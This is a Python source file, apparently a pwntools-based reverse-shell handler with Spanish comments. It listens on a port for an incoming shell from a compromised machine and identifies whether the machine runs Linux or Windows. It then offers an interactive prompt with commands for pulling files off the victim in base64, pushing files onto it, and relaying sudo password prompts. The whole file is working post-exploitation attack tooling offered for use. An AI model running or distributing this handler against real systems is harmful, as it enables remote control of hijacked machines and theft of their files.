from pwn import *
import sys
import os
import base64
import time
import re
import signal
import hashlib
import tqdm
from tqdm import tqdm


def detect_remote_os():

    try:
        conn.sendline(b"uname")
        conn.recvline(timeout=0.5) 
        output = clean_ansi(conn.recvrepeat(0.5).decode(errors='ignore').strip())
        system = output.lower()
        print(output)

        if system and "linux" in system:
            return "Linux"

        conn.sendline(b"ver")
        time.sleep(0.5)
        response = clean_ansi(conn.recvline(timeout=1).decode(errors='ignore').strip())

        if response and "Windows" in response:
            return "Windows"

        return "Desconocido"
    except Exception as e:
        log.error(f"Error al detectar el sistema operativo remoto: {e}")
        return "Error"

def get_local_md5(file_path):
    try:
        with open(file_path, "rb") as f:
            md5 = hashlib.md5(f.read()).hexdigest()
        return md5
    except Exception as e:
        log.error(f"Error al calcular MD5 local de {file_path}: {e}")
        return None


def get_remote_md5(file_path):
    try:
        conn.sendline(f"bash -c 'md5sum {file_path}'".encode())
        time.sleep(0.5)
        response = conn.recvrepeat(1.5).decode(errors='ignore').strip()
        response = clean_ansi(response)
        lines = response.split("\n")

        for line in lines:
            if re.match(r"^[a-fA-F0-9]{32}\s+", line):
                return line.split()[0]

        log.error(f"No se pudo obtener el MD5 remoto, respuesta inesperada: {response}")
        return None

    except Exception as e:
        log.error(f"Error al calcular MD5 remoto de {file_path}: {e}")
        return None

def clean_ansi(text):
    """ Elimina caracteres de escape ANSI y líneas no deseadas del prompt """
    ansi_escape = re.compile(r'\x1b(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])|\x07|\x0f|\x0e')
    cleaned = ansi_escape.sub('', text)
    prompt_pattern = re.compile(r'^\d+;[a-zA-Z0-9_-]+@[^:]+:.*$')

    filtered_lines = []
    for line in cleaned.split('\n'):
        if not prompt_pattern.match(line.strip()):
            filtered_lines.append(line.strip())

    return '\n'.join(filtered_lines)

def sigint_handler(signum, frame):
    print("\n[+] Ctrl+C detectado, deteniendo proceso remoto...")
    conn.sendline(b'kill -2 $$')

def get_clean_response(cmd):
    """Ejecuta un comando en la shell remota y devuelve la respuesta limpia."""
    conn.sendline(cmd.encode())
    conn.recvline(timeout=0.5)
    response = conn.recvline(timeout=2).decode(errors='ignore').strip()
    return clean_ansi(response) if response and response.lower() != cmd else None

def start_listener(port):
    global conn
    try:
        server = listen(port)
        log.success(f"Escuchando en el puerto {port}...")
        conn = server.wait_for_connection()
        log.success("Conexión recibida, iniciando shell interactiva...")
        signal.signal(signal.SIGINT, sigint_handler)

        remote_os = detect_remote_os()
        log.info(f"Sistema operativo remoto detectado: {remote_os}")

        if remote_os == "Linux":
            user = get_clean_response('whoami') or "user"
            path = get_clean_response('pwd') or "/"
        elif remote_os == "Windows":
            user = get_clean_response('echo %USERNAME%') or "user"
            path = get_clean_response('echo %CD%') or "C:\\"
        
        if remote_os == "Linux":

            while True:
                user_colored = f"\033[1;34m{user}\033[0m"  # Azul
                path_colored = f"\033[1;32m{path}\033[0m"  # Verde
                
                print(f"{user_colored}@{path_colored}:$ ", end="", flush=True)
                cmd = sys.stdin.readline().strip()
                if not cmd:
                    continue
                
                if cmd.lower() == "exit":
                    log.info("Cerrando conexión...")
                    break

                elif cmd.startswith("download "):
                    file_path = cmd.split(" ", 1)[1]
                    try:
                        local_file = os.path.basename(file_path)
                        conn.sendline(f"base64 {file_path}".encode())

                        file_data = conn.recvrepeat(2).decode(errors='ignore').strip()
                        file_data = clean_ansi(file_data).replace("\n", "").replace("\r", "").strip()
                        file_data = re.sub(r'[^A-Za-z0-9+/=]', '', file_data)

                        missing_padding = len(file_data) % 4
                        if missing_padding:
                            log.warning(f"La longitud Base64 ({len(file_data)}) no es múltiplo de 4. Ajustando padding...")
                            file_data += "=" * (4 - missing_padding)

                        with open(local_file, "wb") as f:
                            f.write(base64.b64decode(file_data))

                        log.success(f"Archivo {file_path} descargado.")
                        local_md5 = get_local_md5(local_file)
                        remote_md5 = get_remote_md5(file_path)

                        if local_md5 and remote_md5:
                            print(f"\n[+] MD5 local:  {local_md5}")
                            print(f"[+] MD5 remoto: {remote_md5}")

                            if local_md5 == remote_md5:
                                log.success("✔️ Integridad verificada: los hashes coinciden.")
                            else:
                                log.warning("❌ Advertencia: los hashes NO coinciden. Puede haber corrupción en la transferencia.")

                    except base64.binascii.Error as e:
                        log.error(f"Error al decodificar Base64: {e}")
                    except Exception as e:
                        log.error(f"Error al descargar el archivo: {e}")

                elif cmd.startswith("upload "):
                    file_path = cmd.split(" ", 1)[1]
                    try:
                        with open(file_path, "rb") as f:
                            file_data = base64.b64encode(f.read()).decode()

                        conn.sendline(f"echo {file_data} | base64 -d > {os.path.basename(file_path)}".encode())
                        log.info(f"Subiendo {file_path}")

                        local_md5 = get_local_md5(file_path)
                        remote_md5 = get_remote_md5(os.path.basename(file_path))

                        if local_md5 and remote_md5:
                            print(f"\n[+] MD5 local:  {local_md5}")
                            print(f"[+] MD5 remoto: {remote_md5}")

                            if local_md5 == remote_md5:
                                log.success("✔️ Integridad verificada: los hashes coinciden.")
                            else:
                                log.warning("❌ Advertencia: los hashes NO coinciden. Puede haber corrupción en la transferencia.")

                    except Exception as e:
                        log.error(f"Error al subir el archivo: {e}")

                elif cmd.startswith("sudo "):
                    conn.sendline(f"export TERM=xterm; script -qc \"{cmd}\" /dev/null".encode())
                    output = clean_ansi(conn.recvrepeat(0.5).decode(errors='ignore').strip().split("\n")[0])
                    if "password for" in output.lower():
                        print(output)
                        password = sys.stdin.readline().strip()
                        conn.sendline(password.encode())
                    output = clean_ansi(conn.recvrepeat(1.5).decode(errors='ignore').strip())
                    print(output)
                else:
                    conn.sendline(cmd.encode())
                    conn.recvline(timeout=0.5)
                    output = clean_ansi(conn.recvrepeat(0.5).decode(errors='ignore').strip())
                    if output:
                        print(output)

        elif remote_os == "Windows":
            while True:

                user_colored = f"\033[1;34m{user}\033[0m"  # Azul
                path_colored = f"\033[1;32m{path}\033[0m"  # Verde
    
                print(f"{user_colored}@{path_colored}> ", end="", flush=True)
                cmd = sys.stdin.readline().strip()
                if not cmd:
                    continue
                
                if cmd.lower() == "exit":
                    log.info("Cerrando conexión...")
                    break

                elif cmd.startswith("download "):
                    log.warning("Descarga de archivos aún no implementada para Windows.")
                    continue

                elif cmd.startswith("upload "):
                    log.warning("Subida de archivos aún no implementada para Windows.")
                    continue

                else:
                    conn.sendline(cmd.encode())
                    conn.recvline(timeout=0.5)
                    output = clean_ansi(conn.recvrepeat(0.5).decode(errors='ignore').strip())
                    if output:
                        print(output)

    except Exception as e:
        log.error(f"Error: {str(e)}")
    finally:
        server.close()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} <puerto>")
        sys.exit(1)
    
    try:
        port = int(sys.argv[1])
        start_listener(port)
    except ValueError:
        log.error("El puerto debe ser un número entero válido.")
